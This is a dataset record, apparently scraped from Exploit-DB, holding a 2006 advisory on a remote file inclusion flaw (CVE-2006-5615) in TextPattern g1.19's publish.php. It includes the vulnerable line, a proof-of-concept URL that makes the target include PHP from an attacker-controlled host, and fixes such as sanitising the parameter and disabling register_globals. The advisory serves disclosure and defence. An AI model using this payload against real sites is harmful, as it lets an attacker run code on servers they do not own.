{
  "id": "2646",
  "title": "TextPattern 1.19 - &#039;publish.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-5615",
  "vuln_type": "rce",
  "code": "----------------------------------------------------------------------------\r\nTextPattern <=g1.19 (txpcfg[txpath]) Remote File Inclusion Vulnerability\r\n----------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Zeni Susanto A.K.A Bithedz\r\nDate Found\t: October, 25th 2006\r\nLocation\t: Indonesia,Bandung\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication\t: TextPattern\r\nversion\t\t: <=g1.19\r\nURL\t\t: http://textpattern.com/deanload/textpattern_g119.zip\r\n\r\ntextpattern is A free, flexible, elegant, easy-to-use content management system for all kinds of websites, even weblogs.\r\n\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~\r\n\r\nIn file publish.php I found vulnerability script\r\n--------------------------publish.php---------------------------------------\r\ndefine(\"txpath\",$txpcfg['txpath']); \r\n----------------------------------------------------------------------------\r\n\r\nInput passed to the \"txpcfg['txpath']\" parameter in publish.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~\r\nhttp://yourtargetsite/[textpattern_g119_path]/textpattern/publish.php?txpcfg[txpath]=http://attact/colok.txt?\r\nSolution:\r\n~~~~\r\n- Sanitize variable $txpcfg['txpath'] on affected files.\r\n- Turn off register_globals\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~\r\n~ K-159\r\n~ Monik My Brain\r\n~ #bridge (silent) @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~\r\nbithedz[at]gmail[dot]com\r\n\r\n# milw0rm.com [2006-10-25]",
  "url": "https://www.exploit-db.com/exploits/2646"
}